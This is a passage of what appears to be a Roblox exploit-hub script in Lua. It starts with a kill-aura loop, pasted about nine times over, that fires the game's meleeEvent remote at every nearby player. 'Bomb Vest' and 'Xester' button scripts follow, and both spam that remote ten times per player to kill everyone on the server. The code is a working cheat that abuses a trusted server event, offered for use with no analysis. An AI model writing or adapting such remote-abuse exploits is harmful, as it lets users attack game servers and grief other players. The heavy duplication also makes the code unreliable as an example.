            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end

wait(0.1)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end

wait(0.1)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end

wait(0.1)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end

wait(0.1)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end

wait(0.1)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end

wait(0.1)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end

wait(0.1)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end

wait(0.1)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end

wait(0.1)

local lplr = game.Players.LocalPlayer

local check = function(character : Model)
    if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health ~= 0 and (lplr.Character.HumanoidRootPart.Position - character.HumanoidRootPart.Position).magnitude <= 9 then
        return true
    else
        return false
    end
end

while task.wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v ~= lplr and check(v.Character) then
            game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
        end
    end
end end
}
Tab:Button{
	Name = "Bomb Vest",
	Description = nil,
	Callback = function() local Me = game:GetService("Players").LocalPlayer
local Char = Me.Character
local Torso = Char.Torso
local TickWait = 1
local Color = "Medium stone gray"
local Dead = false

local Tool = Instance.new("HopperBin", Me.Backpack)
Tool.Name = "Bomb Vest"

local Position = Vector3.new(0,100,0)
function NewPart(Parent)
local Part = Instance.new("Part", Parent)
Part.CanCollide = false
Part.FormFactor = "Custom"
Part.Position = Position
Part.TopSurface = "Smooth"
Part.BottomSurface = "Smooth"
Part.BrickColor = BrickColor.new(Color)
Position = Position + Vector3.new(0,Part.Size.Y + 10,0)
return Part
end

local Model = Char:FindFirstChild("Bomb")
if Model then Model:Destroy() end

Model = Instance.new("Model", Char)
Model.Name = "Bomb"

local Belt = NewPart(Model)
Belt.Size = Vector3.new(2.2,0.5,1.2)
local Weld = Instance.new("Weld", Belt)
Weld.Part0 = Belt
Weld.Part1 = Torso
Weld.C0 = CFrame.new(0,1.1,0)
local Light = Instance.new("PointLight", Belt)
Light.Range = 15
Light.Brightness = 5
Light.Color = Color3.new(1,0,0)
local Beep = Instance.new("Sound", Belt)
Beep.SoundId = "http://www.roblox.com/asset/?id=188588790"
local ExplodeSound = Instance.new("Sound", Belt)
ExplodeSound.SoundId = "http://www.roblox.com/asset/?id="..(tonumber((math.ceil(1776.66^2)+17).."."..string.rep("36",3))*77)+0.00003 --144507765
ExplodeSound.Pitch = 2.8
ExplodeSound.Volume = 3

local Back = NewPart(Model)
Back.Size = Vector3.new(1.5,1.5,0.5)
local Weld = Instance.new("Weld", Back)
Weld.Part0 = Back
Weld.Part1 = Torso
Weld.C0 = CFrame.new(0,0.1,-0.75)

local StrapLeft = NewPart(Model)
StrapLeft.Size = Vector3.new(0.2,0.5,1.6)
local Weld = Instance.new("Weld", StrapLeft)
Weld.Part0 = StrapLeft
Weld.Part1 = Torso
Weld.C0 = CFrame.new(0.65,-0.9,-0.2)

local BuckleLeft = NewPart(Model)
BuckleLeft.Size = Vector3.new(0.2,1.5,0.2)
local Weld = Instance.new("Weld", BuckleLeft)
Weld.Part0 = BuckleLeft
Weld.Part1 = Torso
Weld.C0 = CFrame.new(0.65,0.1,0.5)

local StrapRight = NewPart(Model)
StrapRight.Size = Vector3.new(0.2,0.5,1.6)
local Weld = Instance.new("Weld", StrapRight)
Weld.Part0 = StrapRight
Weld.Part1 = Torso
Weld.C0 = CFrame.new(-0.65,-0.9,-0.2)

local BuckleRight = NewPart(Model)
BuckleRight.Size = Vector3.new(0.2,1.5,0.2)
local Weld = Instance.new("Weld", BuckleRight)
Weld.Part0 = BuckleRight
Weld.Part1 = Torso
Weld.C0 = CFrame.new(-0.65,0.1,0.5)

Tool.Selected:connect(function(Mouse)
TickWait = 0.3
Mouse.Icon = "http://www.roblox.com/asset/?id=9109985"

Mouse.Button1Down:connect(function()
if Dead == false then
Dead = true
ExplodeSound:Play()
spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
game.Players.LocalPlayer.Character:BreakJoints()
                  end)
end
end)
end)

Tool.Deselected:connect(function()
TickWait = 1
end)

coroutine.wrap(function()
repeat
wait(TickWait)
Light.Enabled = not Light.Enabled
Beep:Play()
until Dead == true
end)() end
}
Tab:Button{
	Name = "Xester",
	Description = nil,
	Callback = function() -----------/XESTER THE CARD MASTER\\-----------
--[[Movelist
Q = The disappearing act.
E = Full house
R = Cardnado
T = Teleport
Y = Big card(Click to smash.)
U = Black hole
P = Card shield(Click to bounce people off, press p again to shred.)
F = Transform(You can switch between modes any time.)
-----------/SECOND FORM MOVES\-----------
T = Laugh
G = Fire ball
H = Huge fire ball
J = Dragon's breath(The longer you hold, the more insaner it gets.)
K = Beam(The longer you hold down the key, the stronger it gets/longer it lasts.)
---------]]

--"Now you see me 2" is a good movie, which is why i've made this.--
--Sadly, this got logged, one of my best work just being thrown out like this is a real shame.--
--This was made before FE so using this may or may not lag the server--
--Keep in mind that THIS was never even finished at all, i stopped working on this when skidcentric leaked it, who knows how big this script could've been?--

Player=game:GetService("Players").LocalPlayer
Character=Player.Character
Character.Humanoid.Name = "noneofurbusiness"
hum = Character.noneofurbusiness
LeftArm=Character["Left Arm"]
LeftLeg=Character["Left Leg"]
RightArm=Character["Right Arm"]
RightLeg=Character["Right Leg"]
Root=Character["HumanoidRootPart"]
Head=Character["Head"]
Torso=Character["Torso"]
Neck=Torso["Neck"]
walking = false
jumping = false
allowgrassy = false
zxc = false
matte = nil
colori = nil
bigball = false
attacking = false
laughing = false
running = false
downpress = false
taim = nil
change = 0
ws = 10
appi = false
tauntdebounce = false
position = nil
staybooming = false
MseGuide = true
levitate = false
firsttime5 = false
notallowedtransform = false
settime = 0
firsttime2 = false
sine = 0
t = 0
combo1 = true
dgs = 75
combo2 = false
firsttime3 = false
combo3 = false
local bl = {907530553,907527750,907527912}
colortable = {"Really black","Really red"}
colors = #colortable
blz = #bl
local aces = {1880203893,1881287656,1881287420,1881288034}
ace = #aces
local laughs = {2011349649,2011349983,2011351501,2011352223,2011355991,2011356475}
laugh = #laughs
mouse = Player:GetMouse()
RunSrv = game:GetService("RunService")
RenderStepped = game:GetService("RunService").RenderStepped
removeuseless = game:GetService("Debris")
damageall={}
Repeater={}
Repeater2={}
magictable={}
nonmeshRepeater={}
nonmeshRepeater2={}
dmgii={}
DamageAll2={}
SlowlyFade={}
th1={}
lolzor={}
lolzor2={}
th2={}
keyYsize={}
blocktrail={}
keyYtransparency={}
th3={}
laughingtable={}
Extreme={}
ExtremeM={}
ExtremeM2={}
m3={}
th4={}
th5={}
UpMover={}
openshocktable={}
LessSize={}
ForwardMover={}
FadeIn={}
signtransparency={}
signmover={}
signrotator={}

screenGui = Instance.new("ScreenGui")
screenGui.Parent = script.Parent

FireBall = Instance.new("Sound",LeftArm)
FireBall.SoundId = "rbxassetid://842332424"
FireBall.Volume = 5
FireBall.Pitch = 2.5

BigFireBall = Instance.new("Sound",LeftArm)
BigFireBall.SoundId = "rbxassetid://842332424"
BigFireBall.Volume = 8
BigFireBall.Pitch = 1.5

local HEADLERP = Instance.new("ManualWeld")
HEADLERP.Parent = Head
HEADLERP.Part0 = Head
HEADLERP.Part1 = Head
HEADLERP.C0 = CFrame.new(0, -1.5, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local TORSOLERP = Instance.new("ManualWeld")
TORSOLERP.Parent = Root
TORSOLERP.Part0 = Torso
TORSOLERP.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local ROOTLERP = Instance.new("ManualWeld")
ROOTLERP.Parent = Root
ROOTLERP.Part0 = Root
ROOTLERP.Part1 = Torso
ROOTLERP.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local RIGHTARMLERP = Instance.new("ManualWeld")
RIGHTARMLERP.Parent = RightArm
RIGHTARMLERP.Part0 = RightArm
RIGHTARMLERP.Part1 = Torso
RIGHTARMLERP.C0 = CFrame.new(-1.5, 0, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local LEFTARMLERP = Instance.new("ManualWeld")
LEFTARMLERP.Parent = LeftArm
LEFTARMLERP.Part0 = LeftArm
LEFTARMLERP.Part1 = Torso
LEFTARMLERP.C0 = CFrame.new(1.5, 0, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local RIGHTLEGLERP = Instance.new("ManualWeld")
RIGHTLEGLERP.Parent = RightLeg
RIGHTLEGLERP.Part0 = RightLeg
RIGHTLEGLERP.Part1 = Torso
RIGHTLEGLERP.C0 = CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local LEFTLEGLERP = Instance.new("ManualWeld")
LEFTLEGLERP.Parent = LeftLeg
LEFTLEGLERP.Part0 = LeftLeg
LEFTLEGLERP.Part1 = Torso
LEFTLEGLERP.C0 = CFrame.new(0.5, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local function weldBetween(a, b)
    local weld = Instance.new("ManualWeld", a)
    weld.Part0 = a
    weld.Part1 = b
    weld.C0 = a.CFrame:inverse() * b.CFrame
    return weld
end

function makeblockytrail()
coroutine.wrap(function()
while true do
for i,v in pairs(blocktrail) do
smke = Instance.new("Part",v)
smke.CFrame = v.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
smke.Material = "Neon"
smke.Anchored = true
smke.CanCollide = false
removeuseless:AddItem(smke,2)
end
swait()
end
end)()
end

local function ci(x, c, y, n)
so = Instance.new("Sound", x)
so.SoundId = c
so.Volume = y
so.Looped = n
end

function ghost()
fakeeyo2 = Instance.new("Part",Head)
fakeeyo2.BrickColor = BrickColor.new("White")
fakeeyo2.Material = "Neon"
fakeeyo2.Shape = "Ball"
fakeeyo2.Anchored = true
fakeeyo2.CFrame = eyo2.CFrame
fakeeyo2.CanCollide = false
fakeeyo2.Size = Vector3.new(0.33, 0.33, 0.33)
table.insert(ghosttable,fakeeyo2)
removeuseless:AddItem(fakeeyo2,3)

fakeeyo1 = Instance.new("Part",Head)
fakeeyo1.BrickColor = BrickColor.new("White")
fakeeyo1.Material = "Neon"
fakeeyo1.Shape = "Ball"
fakeeyo1.CanCollide = false
fakeeyo1.Anchored = true
fakeeyo1.CFrame = eyo1.CFrame
fakeeyo1.Size = Vector3.new(0.33, 0.33, 0.33)
table.insert(ghosttable,fakeeyo1)
removeuseless:AddItem(fakeeyo1,3)

fakemask = Instance.new("Part",Character)
fakemask.Size = Vector3.new(1,1,1)
fakemask.CFrame = mask.CFrame
fakemask.Material = "Neon"
fakemask.CanCollide = false
fakemask.Anchored = true
fakemask.BrickColor = BrickColor.new("White")
fakemask.Transparency = .5
mfMask = Instance.new("SpecialMesh", fakemask)
mfMask.MeshType = "FileMesh"
mfMask.Scale = Vector3.new(0.13, 0.13, 0.1)
mfMask.MeshId = 'http://www.roblox.com/asset/?id=5158270'
table.insert(ghosttable,fakemask)
removeuseless:AddItem(fakemask,3)


fakejester = Instance.new("Part",Character)
fakejester.Size = Vector3.new(2,2,2)
fakejester.CFrame = jester.CFrame
fakejester.CanCollide = false
fakejester.Transparency = .5
fakejester.Anchored = true
fakejester.BrickColor = BrickColor.new("White")
fakejesterm = Instance.new("SpecialMesh", fakejester)
fakejesterm.MeshType = "FileMesh"
fakejesterm.Scale = Vector3.new(1.1, 1.1, 1.1)
fakejesterm.MeshId = 'rbxassetid://1241662062'
table.insert(ghosttable,fakejester)
removeuseless:AddItem(fakejester,3)


fakehead = Instance.new("Part",Character)
fakehead.Size = Vector3.new(1.01,1.01,1.01)
fakehead.Anchored = true
fakehead.CanCollide = false
fakehead.Transparency = .5
fakehead.BrickColor = BrickColor.new("White")
fakehead.Material = "Neon"
fakehead.CFrame = Head.CFrame
fakeheadmesh = Instance.new("SpecialMesh",fakehead)
fakeheadmesh.MeshType = "Head"
fakeheadmesh.Scale = Vector3.new(1.255,1.255,1.255)
table.insert(ghosttable,fakehead)
removeuseless:AddItem(fakehead,3)


fakelarm = Instance.new("Part",Character)
fakelarm.CFrame = LeftArm.CFrame
fakelarm.Size = Vector3.new(1,2,1)
fakelarm.CanCollide = false
fakelarm.Transparency = .5
fakelarm.Material = "Neon"
fakelarm.Anchored = true
table.insert(ghosttable,fakelarm)
removeuseless:AddItem(fakelarm,3)


fakerarm = Instance.new("Part",Character)
fakerarm.CFrame = RightArm.CFrame
fakerarm.Size = Vector3.new(1,2,1)
fakerarm.Transparency = .5
fakerarm.CanCollide = false
fakerarm.Material = "Neon"
fakerarm.Anchored = true
table.insert(ghosttable,fakerarm)
removeuseless:AddItem(fakerarm,3)


fakelleg = Instance.new("Part",Character)
fakelleg.CFrame = LeftLeg.CFrame
fakelleg.Size = Vector3.new(1,2,1)
fakelleg.Transparency = .5
fakelleg.CanCollide = false
fakelleg.Material = "Neon"
fakelleg.Anchored = true
table.insert(ghosttable,fakelleg)
removeuseless:AddItem(fakelleg,3)


fakerleg = Instance.new("Part",Character)
fakerleg.CFrame = RightLeg.CFrame
fakerleg.Size = Vector3.new(1,2,1)
fakerleg.Transparency = .5
fakerleg.CanCollide = false
fakerleg.Material = "Neon"
fakerleg.Anchored = true
table.insert(ghosttable,fakerleg)
removeuseless:AddItem(fakerleg,3)


fakeTorso = Instance.new("Part",Character)
fakeTorso.CFrame = Torso.CFrame
fakeTorso.Size = Vector3.new(2,2,1)
fakeTorso.Transparency = .5
fakeTorso.CanCollide = false
fakeTorso.Material = "Neon"
fakeTorso.Anchored = true
table.insert(ghosttable,fakeTorso)
removeuseless:AddItem(fakeTorso,3)
end

ghosttable={}
coroutine.wrap(function()
while true do
for i,v in pairs(ghosttable) do
v.Transparency = v.Transparency + 0.025
end
wait()
end
end)()

function MAKETRAIL(PARENT,POSITION1,POSITION2,LIFETIME,COLOR)
A = Instance.new("Attachment", PARENT)
A.Position = POSITION1
A.Name = "A"
B = Instance.new("Attachment", PARENT)
B.Position = POSITION2
B.Name = "B"
tr1 = Instance.new("Trail", PARENT)
tr1.Attachment0 = A
tr1.Attachment1 = B
tr1.Enabled = true
tr1.Lifetime = LIFETIME
tr1.TextureMode = "Static"
tr1.LightInfluence = 0
tr1.Color = COLOR
tr1.Transparency = NumberSequence.new(0, 1)
end

function clean()
damageall={}
Repeater={}
Repeater2={}
nonmeshRepeater={}
nonmeshRepeater2={}
dmgii={}
DamageAll2={}
SlowlyFade={}
th1={}
th2={}
th3={}
Extreme={}
ExtremeM={}
ExtremeM2={}
m3={}
th4={}
th5={}
UpMover={}
openshocktable={}
LessSize={}
ForwardMover={}
FadeIn={}
signtransparency={}
signmover={}
signrotator={}
end

coroutine.wrap(function()
while wait() do
hum.WalkSpeed = ws
LeftArm.BrickColor = BrickColor.new("Really black")
RightArm.BrickColor = BrickColor.new("Really black")
Head.BrickColor = BrickColor.new("Really black")
end
end)()
--[[
godmode = coroutine.wrap(function()
for i,v in pairs(Character:GetChildren()) do
if v:IsA("BasePart") and v ~= Root then
v.Anchored = false
end
end
while true do
hum.MaxHealth = math.huge
wait(0.0000001)
hum.Health = math.huge
wait()
end
end)
godmode()
ff = Instance.new("ForceField", Character)
ff.Visible = false

coroutine.wrap(function()
for i,v in pairs(Character:GetChildren()) do
if v.Name == "Animate" then v:Remove()
end
end
end)()
]]

function damagealll(Radius,Position)		
	local Returning = {}		
	for _,v in pairs(workspace:GetChildren()) do		
		if v~=Character and v:FindFirstChildOfClass('Humanoid') and v:FindFirstChild('Torso') or v:FindFirstChild('UpperTorso') then
if v:FindFirstChild("Torso") then		
			local Mag = (v.Torso.Position - Position).magnitude		
			if Mag < Radius then		
				table.insert(Returning,v)		
			end
elseif v:FindFirstChild("UpperTorso") then	
			local Mag = (v.UpperTorso.Position - Position).magnitude		
			if Mag < Radius then		
				table.insert(Returning,v)		
			end
end	
		end		
	end		
	return Returning		
end

ArtificialHB = Instance.new("BindableEvent", script)
ArtificialHB.Name = "Heartbeat"
script:WaitForChild("Heartbeat")

frame = 1 / 60
tf = 0
allowframeloss = false
tossremainder = false


lastframe = tick()
script.Heartbeat:Fire()


game:GetService("RunService").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.Heartbeat:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				script.Heartbeat:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)

function swait(num)
	if num == 0 or num == nil then
		game:service("RunService").Stepped:wait(0)
	else
		for i = 0, num do
			game:service("RunService").Stepped:wait(0)
		end
	end
end

doomtheme = Instance.new("Sound", Torso)
doomtheme.Volume = 3
doomtheme.Name = "doomtheme"
doomtheme.Looped = true
doomtheme.SoundId = "rbxassetid://1843358057"
doomtheme:Play()

Torso.ChildRemoved:connect(function(removed)
if removed.Name == "doomtheme" then
if levitate then
doomtheme = Instance.new("Sound", Torso)
doomtheme.Volume = 3
doomtheme.Name = "doomtheme"
doomtheme.Looped = true
doomtheme.SoundId = "rbxassetid://1382488262"
doomtheme:Play()
doomtheme.TimePosition = 20.7
else
doomtheme = Instance.new("Sound", Torso)
doomtheme.Volume = 3
doomtheme.Name = "doomtheme"
doomtheme.Looped = true
doomtheme.SoundId = "rbxassetid://1843358057"
doomtheme:Play()
end
end
end)

for _,n in pairs(Character:GetChildren()) do
if n:IsA("Accessory") then n:Remove() end
end
for _,x in pairs(Character:GetChildren()) do
if x:IsA("Decal") then x:Remove() end
end

glow = Instance.new("Part",Head)
glow.Size = Vector3.new(.488,.3,.1)
glow.CanCollide = false
glow.Material = "Neon"
glow.Transparency = 1
glow.BrickColor = BrickColor.new("Really white")
glowweld = weldBetween(glow,Head)
glowweld.C0 = CFrame.new(0,.2,.565)

leftlocation = Instance.new("Part",LeftArm)
leftlocation.Size = Vector3.new(1,1,1)
leftlocation.Transparency = 1
leftlocationweld = weldBetween(leftlocation,LeftArm)
leftlocationweld.C0 = CFrame.new(0,1.2,0)
rightlocation = Instance.new("Part",RightArm)
rightlocation.Size = Vector3.new(1,1,1)
rightlocation.Transparency = 1
rightlocationweld = weldBetween(rightlocation,RightArm)
rightlocationweld.C0 = CFrame.new(0,1.2,0)

shirt = Instance.new("Shirt", Character)
shirt.Name = "Shirt"
pants = Instance.new("Pants", Character)
pants.Name = "Pants"
Character.Shirt.ShirtTemplate = "rbxassetid://676428254"----lol
Character.Pants.PantsTemplate = "rbxassetid://676428351"

fakehed = Instance.new("Part",Character)
fakehed.Size = Vector3.new(1.01,1.01,1.01)
fakehed.Anchored = false
fakehed.CanCollide = false
fakehed.Transparency = 0
fakehed.BrickColor = BrickColor.new("Really black")
fakehed.Material = "Neon"
fakehed.CFrame = Head.CFrame
fakehedweld = weldBetween(fakehed,Head)
fakehedmesh = Instance.new("SpecialMesh",fakehed)
fakehedmesh.MeshType = "Head"
fakehedmesh.Scale = Vector3.new(1.255,1.255,1.255)

jester = Instance.new("Part",Character)
jester.Size = Vector3.new(2,2,2)
jester.CFrame = Head.CFrame
jester.CanCollide = false
jesterWeld = Instance.new("Weld",jester)
jesterWeld.Part0 = jester
jesterWeld.Part1 = Head
jesterWeld.C0 = jester.CFrame:inverse() * Head.CFrame * CFrame.new(0,-.3,0) * CFrame.Angles(math.rad(0),math.rad(90),0)
mjester = Instance.new("SpecialMesh", jester)
mjester.MeshType = "FileMesh"
mjester.Scale = Vector3.new(1.1, 1.1, 1.1)
mjester.MeshId,mjester.TextureId = 'rbxassetid://1241662062','rbxassetid://1241662395'

mask = Instance.new("Part",Character)
mask.Size = Vector3.new(1,1,1)
mask.CFrame = Head.CFrame
mask.CanCollide = false
maskweld = weldBetween(mask,Head)
maskweld.C0 = CFrame.new(0,-.555,0) * CFrame.Angles(math.rad(90),0,0)
mMask = Instance.new("SpecialMesh", mask)
mMask.MeshType = "FileMesh"
mMask.Scale = Vector3.new(0.13, 0.13, 0.1)
mMask.MeshId,mMask.TextureId = 'http://www.roblox.com/asset/?id=5158270','http://www.roblox.com/asset/?id=9543585'

eyo1 = Instance.new("Part",Head)
eyo1.BrickColor = BrickColor.new("White")
eyo1.Material = "Neon"
eyo1.Shape = "Ball"
eyo1.Name = "eyo1"
eyo1.CanCollide = false
eyo1.Size = Vector3.new(0.33, 0.33, 0.33)
eyo1weld = weldBetween(eyo1,Head)
eyo1weld.C0 = CFrame.new(.215,-.05,.52)

light = Instance.new("PointLight", eyo1)
light.Color = Color3.new(1,1,1)
light.Range = 3
light.Brightness = 4
light.Enabled = true

eyo2 = Instance.new("Part",Head)
eyo2.BrickColor = BrickColor.new("White")
eyo2.Material = "Neon"
eyo2.Shape = "Ball"
eyo2.Name = "eyo2"
eyo2.CanCollide = false
eyo2.Size = Vector3.new(0.33, 0.33, 0.33)
eyo2weld = weldBetween(eyo2,Head)
eyo2weld.C0 = CFrame.new(-.215,-.05,.52)

light2 = Instance.new("PointLight", eyo2)
light2.Color = Color3.new(1,1,1)
light2.Range = 3
light2.Brightness = 4
light2.Enabled = true

function SOUND(PARENT,ID,VOL,LOOP,REMOVE)
so = Instance.new("Sound")
so.Parent = PARENT
so.SoundId = "rbxassetid://"..ID
so.Volume = VOL
so.Looped = LOOP
so:Play()
removeuseless:AddItem(so,REMOVE)
end


mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='r' then
if levitate then return end
if debounce then return end
debounce = true
attacking = true
appi = true
ws = 0
coroutine.wrap(function()
while appi do
wait()
if Root.Velocity.Magnitude < 2 and attacking == true then
position = "Idle2"
end
end
end)()
coroutine.wrap(function()
while appi do
wait()
settime = 0.05
sine = sine + change
if position == "Idle2" and attacking == true and appi == true then
change = .4
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
end
end
end)()
for i = 1, 20 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,1.5,-.1),.5)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10),math.rad(10)),.3)
swait()
end
SOUND(RightArm,342337569,6,false,1)
coroutine.wrap(function()
for i = 1, 9 do
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(.1,1.6,-.1),.5)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10),math.rad(15)),.3)
swait()
end
for i = 1, 9 do
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,1.5,-.1),.5)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10),math.rad(10)),.3)
swait()
end
end)()
shockwave = Instance.new("Part",Torso)
shockwave.Shape = "Ball"
shockwave.Size = Vector3.new(1,1,1)
shockwave.BrickColor = BrickColor.new("White")
shockwave.Material = "Neon"
shockwave.CFrame = Torso.CFrame
shockwave.CanCollide = false
shockwave.Anchored = true
coroutine.wrap(function()
for i = 1, 20 do
shockwave.Size = shockwave.Size + Vector3.new(1.8,1.8,1.8)
shockwave.Transparency = shockwave.Transparency + 0.05
wait()
end
end)()
SOUND(Torso,1072606965,0,false,10)
coroutine.wrap(function()
for i = 1, 10 do
so.Volume = so.Volume + 0.3
wait()
end
end)()
for i = 1, 35 do
local Hit = damagealll(22,Torso.Position)	
for _,v in pairs(Hit) do		
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)	
vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
vel.velocity = CFrame.new(Torso.Position,torso.Position).lookVector*20
removeuseless:AddItem(vel,.1)
end
wave = Instance.new("Part", Torso)
wave.Size = Vector3.new(1, 1, 1)
wave.Transparency = 0
wave.BrickColor = BrickColor.new("White")
wave.Anchored = true
wave.CanCollide = false
wave.CFrame = Root.CFrame * CFrame.new(0, -2.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))
wavemesh = Instance.new("SpecialMesh", wave) 
wavemesh.MeshId = "rbxassetid://20329976" 
wavemesh.Scale = Vector3.new(1, 1, 1)
table.insert(th2,wave)
